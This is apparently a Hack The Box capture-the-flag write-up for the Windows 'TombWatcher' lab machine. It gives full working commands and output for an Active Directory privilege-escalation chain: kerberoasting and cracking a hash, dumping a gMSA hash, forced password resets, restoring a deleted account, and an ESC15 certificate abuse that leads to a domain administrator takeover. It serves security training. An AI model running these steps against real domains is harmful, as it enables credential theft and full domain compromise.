## Intro

![](MediaFiles/Pasted%20image%2020250714123939.png)
Description:
```
As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!, so its an assumed breach scenario
```
[[windows]] [[AssumedBreach]] [[certificates]] [[certvulntoESC15]] [[RecycleBin]]
Tags: #windows #AssumedBreach #certificates #certvulntoESC15 #RecycleBin 
Tools used:
- rpcclient
- smbclient
- bloodyAD
- certipy-ad
- gMSADumper
- john
- targetedkerberoast

----
# Reconnaissance

Add machine to `/etc/hosts`
```bash
sudo sh -c "echo '10.10.11.72 DC01.tombwatcher.htb tombwatcher.htb' >> /etc/hosts"
```

start the nmap scan
```bash
sudo nmap -sC -sV tombwatcher.htb
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 13:10 EDT
Nmap scan report for tombwatcher.htb (10.10.11.72)
Host is up (0.048s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-25 21:10:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-25T21:11:34+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-25T21:11:34+00:00; +4h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-25T21:11:34+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-25T21:11:34+00:00; +4h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-25T21:10:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.60 seconds
```
We see RPC being open, along with other ports that indicate that the target is a Domain Controller

According to the description, we are given creds:
```
henry
H3nry_987TGV!
```

lets try to login with win-rm since we can see its port is open
```bash
evil-winrm -i 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!'
```
![](MediaFiles/Pasted%20image%2020250625202741.png)

### Checking our given creds with nxc 

using my script for automating the nxc valid credential identification towards multiple open services
https://github.com/ch3ckkm8/auto_netexec
```bash
./auto_netexec_bulk_creds_checker.sh tombwatcher.htb 'henry' 'H3nry_987TGV!'
```

```bash
[*] Checking if winrm port 5985 is open on tombwatcher.htb...
[+] Port 5985 open — checking winrm with netexec
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!

[*] Checking if smb port 445 is open on tombwatcher.htb...
[+] Port 445 open — checking smb with netexec
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Checking if ldap port 389 is open on tombwatcher.htb...
[+] Port 389 open — checking ldap with netexec
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Checking if rdp port 3389 is open on tombwatcher.htb...
[-] Skipping rdp — port 3389 is closed

[*] Checking if wmi port 135 is open on tombwatcher.htb...
[+] Port 135 open — checking wmi with netexec
RPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
RPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[*] Checking if nfs port 2049 is open on tombwatcher.htb...
[-] Skipping nfs — port 2049 is closed

[*] Checking if ssh port 22 is open on tombwatcher.htb...
[-] Skipping ssh — port 22 is closed

[*] Checking if vnc port 5900 is open on tombwatcher.htb...
[-] Skipping vnc — port 5900 is closed

[*] Checking if ftp port 21 is open on tombwatcher.htb...
[-] Skipping ftp — port 21 is closed

[*] Checking if mssql port 1433 is open on tombwatcher.htb...
[-] Skipping mssql — port 1433 is closed
```
So with these creds we can login to `SMB` , `LDAP` and `RPC`. 

### Checking SMB service
```bash
smbclient -U 'henry' -L tombwatcher.htb
```

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
```
Nothing interesting found here, lets try `RPC`

### Checking RPC service

#### Anonymous login: 
```bash
rpcclient -U "" -N 10.10.11.72
```

```bash
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```
so anonymous login gives us access denied
#### Login with henry: 
```bash
rpcclient -U 'henry%H3nry_987TGV!' 10.10.11.72
```

#### Enumerate domain users
```bash
enumdomusers
```

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]
```

#### Enumerate domain groups
```bash
enumdomgroups
```

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Infrastructure] rid:[0x453]
```

### Bloodhound as henry

```bash
sudo bloodhound-python -d tombwatcher.htb -u henry -p H3nry_987TGV! -ns 10.10.11.72 -c all
```

![](MediaFiles/Pasted%20image%2020250625211749.png)
hm interesting, when i see SPN my mind goes to one thing, and this is `kerberoasting`

---
# Foothold

## Kerberoasting

```bash
sudo ntpdate DC01.tombwatcher.htb
```

```bash
python targetedkerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'
```

```shell
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bd373892205e07dd64071d97f2552431$f43159f7658d8d69b9d20dee270d57a9d6eb60a5f862c396ebd61dea93561b4327443041a11e7c6c387072cf784be90311836dc09084b47c70ebd58a2e10121aa6f3eb137d6e7183bf33c8dafdbbb9773ccbdce1bae55bdb18f0abea2d4512f9086e3607b781f05a5a92e8c139ed51fbc8f6c208301406354e3240651c58c4e4ed96efbba7306f354d91fd756d652230edcf777d4b8351948874c339d88ef80184936c39cae3191eb03d1eae774b09a62b7ce9743c2d54e1c28a58f35294995dda16a23962e9ea852a3be882e9bb775c679bb1b9f21951e2fc0a96ad570a4ed85992ae22f53348ceeeec812f1969994273857a59cb9f2fbbd206fa4754e1bc5407a6fe9057641313f7845eb327d1ef7803619b167daf3f0010e094e055d592bd30fadbfb8e4adc1b94dfc6e41894d38837a1d2db0651a85c6fff03aff6280139404b9c9a195351a81aa55be4596975a9850349e9e6831403e0fe1c0191dd803df6819231742dee062e74a9eb9847d3a2c4a584724ba20f3ddd8399453ab3bfe209593806e441801cfbb6ba844ba753c9347cc042ab85c49d4cd06cab961595808f24013a195226e43a9470db6998a5b5ee7981a0d4e5825fc0a13f31314ed85b5358f890f6a113a8ab9ba7a4fa6086a6f92dc158e2e5e360992a73fa1f0eb924d730531e716dbf3973f52b14560468ee3538b1cfb5ce83ff66b6894ef3af9baf3ce2dc7d9a1b9f96f1282ad11e5ce27ae3f3a9025c94724e8ed470e9f35bf47565063d8cd57c39114347de03202d425e5bb9a9a7488572a018c0456f989614d35054ac7a031468e00b47042bbb784d82b92fc8f9aadaf7e8c284453ce98ae714e2474ad57f83a6c3d3c6ad966e4bbad062e9398a55b0cdd6906f9cde3e02fc338b51e68033ffc1052f6f928373c9501d4b0b90c0624fd1c22bedc8f5fa0a0f777fd1bc1e745c987a76f5a3212539f68f343586b3089795a8d49cbea0b3b631b4a1122bb98ad11235ee0eb57ef7213dc69d2341d5f03532f7618e31c9f0149dc2152a1ebbbb0d90740d572e9b73160d2df0fc7e9726273e16a3d4b71c83e80d0aad9751aaabd2a328709f2c1004d8534e2ae88d6836f8a386793c18ed875f352dcb1bf82acc37361f08607b1bbdef618f5e400603a01a151ab6f1b5f6007b16867457755de2fbb66313bfddfed38bb4f68e543041c8331c42208a9d7c76ed2badff7b34170eedd6ba76d6f51bea695dc762a4e8d6c1524237dd6fb53dd7c24c0413a73083fd0f3d27cc4f70caec94f2721c36c2ca7e9193c0fd2b1bd520d55145e520d131e9e52e9a7f9a3adc515de78505e929b2f45bc6e6984be26a7d91a6e9fa29114cd7965406b764e616b31e70ed5d1efb237c57b4636e13782ce1a69e8e6d86ee7f684ec9431898fa87a84345064f4288a5e68ea37dc6adfac44de97f8beb00dd949a58f33f2b6cd76b1a8248d06a139c23ca
[VERBOSE] SPN removed successfully for (Alfred)
```

lets crackit
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-06-25 18:52) 100.0g/s 153600p/s 153600c/s 153600C/s 123456..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the updated creds are now
```bash
Alfred
basketball
```
now launch again bloodhound
## Bloodhound as alfred
```bash
bloodhound-python -u alfred  -p 'basketball'  -d tombwatcher.htb -ns 10.129.190.198 -c All --zip
```

lets try to login with win-rm since we can see its port is open
```bash
evil-winrm -i 10.129.190.5 -u 'alfred' -p 'basketball'
```

no luck, lets inspect bloodhound and see what alfred can do
![](MediaFiles/Pasted%20image%2020250625222134.png)

```bash
bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
```
![](MediaFiles/Pasted%20image%2020250625222447.png)
added successfully

lets now inspect what the `INFRASTRUCTURE` group can do
![](MediaFiles/Pasted%20image%2020250625222537.png)
the infrastructure group has `ReadGMSAPassword` over ansible dev group

## GMSA Dump

https://github.com/micahvandeusen/gMSADumper
```shell
git clone https://github.com/micahvandeusen/gMSADumper
```

```bash
python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb 
```

```bash
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
ansible_dev$:aes256-cts-hmac-sha1-96:499620251908efbd6972fd63ba7e385eb4ea2f0ea5127f0ab4ae3fd7811e600a
ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226
```
grab the hash from here
```bash
ansible_dev$:::4b21348ca4a9edff9689cdf75cbda439
```

run bloodhound again, with the hash of ansible_dev
```bash
bloodhound-python -u 'ansible_dev$'  --hashes ':4b21348ca4a9edff9689cdf75cbda439' -d tombwatcher.htb -ns 10.129.190.5 -c All --zip
```

now lets see what ansible_dev can do via bloodhound
![](MediaFiles/Pasted%20image%2020250625224727.png)

Lets change the password of SAM as ansible_dev
```bash
bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'ansible_dev$' -p ':4b21348ca4a9edff9689cdf75cbda439' set password SAM 'TheBestpassword0!'
```
![](MediaFiles/Pasted%20image%2020250625224916.png)
pass change successful

run bloodhound again
```bash
bloodhound-python  -u 'SAM' -p 'TheBestpassword0!' -d tombwatcher.htb -ns 10.129.190.5 -c All --zip
```

lets see what sam can do
![](MediaFiles/Pasted%20image%2020250625225433.png)
he has `WriteOwner` towards john

```bash
sudo ntpdate DC01.tombwatcher.htb
```
### make SAM the owner of john
```bash
impacket-owneredit -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'TheBestpassword0!' -dc-ip 10.129.190.5
```
or
```shell
python owneredit.py -action write -target 'john' -new-owner 'sam' 'tombwatcher.htb/sam':'TheBestpassword0!' -dc-ip 10.129.190.5
```

```bash
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
### set genericAll over john as sam 
```bash
bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'sam' -p 'TheBestpassword0!' add genericAll JOHN sam
```
![](MediaFiles/Pasted%20image%2020250625234629.png)
it was successful, lets move on
### Set john's pass
```bash
bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb' -u 'sam' -p 'TheBestpassword0!' set password JOHN 'TheBestpassword2!'
```
![](MediaFiles/Pasted%20image%2020250625234655.png)
was successful too, lets login with winrm now
```bash
evil-winrm -i 10.129.190.5 -u 'john' -p 'TheBestpassword2!'
```

it was successful, lets grab user flag!
```bash
b8e8a1b48f8f2b29fef17cd91633172a
```

# Privesc

### Bloodhound as john

Run bloodhound again, now as john
```shell
sudo bloodhound-python -d tombwatcher.htb -u john -p TheBestpassword2! -ns 10.10.11.72 -c all
```

Lets observe the outbound control of john:
![](MediaFiles/Pasted%20image%2020250714130313.png)
John has `GenericAll` over `CERT_ADMIN` and `CERT_ADM` , and also owns `CERT_ADM`

## Find vulnerable certificates as `john`
```shell
certipy-ad find -vulnerable -u john@tomwatcher.htb -p "TheBestpassword2!" -dc-ip 10.129.190.5
```

```shell
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via CSRA
[!] Got error while trying to get CA configuration for 'tombwatcher-CA-1' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'tombwatcher-CA-1'
[!] Failed to lookup user with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saved BloodHound data to '20250712140936_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250712140936_Certipy.txt'
[*] Saved JSON output to '20250712140936_Certipy.json'
```

```shell
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

No vulnerable cert templates found, what now?

#### How to move forward

Well.. lets get suspicious about the machine's name, it contains the keyword `tomb`. With the help of google i came across this:
```
In Active Directory, tombstones are essentially placeholders for deleted objects, allowing for replication across domain controllers before the objects are permanently removed.
```
So knowing that, it could be a hint, lets try to view and potentially retrieve deleted objects.

## Check for deleted objects 

Lets find deleted objects in the Recycle bin:
```shell
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List
```

```shell
Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb
```
### Restore deleted object, we also see that they are related to user`cert_admin`

Restore the object via the `ObjectGUID` we found above
```shell
Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
```

## Set a new password for `cert_admin`

Since `john` has `GenericAll` perimission over `cert_admin`, we can set a new password:
```shell
bloodyAD --host '10.129.190.5' -d 'tombwatcher.htb'  -u 'john' -p 'TheBestpassword2!' set password cert_admin 'Abc123456@#' 
```

## Find vulnerable certificates as `cert_admin`
```shell
certipy-ad find -u cert_admin -p "Abc123456@#" -dc-ip 10.129.190.5 -vulnerable
```

```shell
└─$ cat 20250712122656_Certipy.txt                                                  
Certificate Authorities                                                             
  0                                                                                 
    CA Name                             : tombwatcher-CA-1                          
    DNS Name                            : DC01.tombwatcher.htb                      
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb                                                                                   
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC          
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00                 
    Certificate Validity End            : 2123-11-16 00:57:48+00:00                 
    Web Enrollment                                                                  
      HTTP                                                                          
        Enabled                         : False                                     
      HTTPS                                                                         
        Enabled                         : False                                     
    User Specified SAN                  : Disabled                                  
    Request Disposition                 : Issue                                     
    Enforce Encryption for Requests     : Enabled                                   
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy                                                                                  
    Permissions                                                                     
      Owner                             : TOMBWATCHER.HTB\Administrators            
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```
we can see that is vulnerable to `ESC15`
## Request a certificate as `cert_admin` for `administrator`
```shell
certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@#' \
    -dc-ip '10.129.190.5' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -upn 'administrator@tombwatcher.htb'  \
    -application-policies 'Client Authentication'
```
(I was literally stuck 4 hours on this, the problem was the certipy version being not 5.0.2 ............. it did not recognize the -application-policies part, this is the version that worked:
`Certipy v5.0.2 - by Oliver Lyak (ly4k)`)

## Change administrator's pass via the `.pfx`
```shell
certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.190.5' -ldap-shell
```

once we get shell, change the password of the administrator:
```shell
change_password administrator Abc123456@#
```

```shell  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.129.190.5:636'
[*] Authenticated to '10.129.190.5' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# change_password administrator Abc123456@#
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Abc123456@#
Password changed successfully!
```

finally login in as administrator
```shell
evil-winrm -i 10.129.190.5 -u 'Administrator' -p 'Abc123456@#'
```
got root flag!
```shell
7f3831dc40795365d5b53356cb6815fa
```
pwned

-----------
# Summary



-----
# Sidenotes




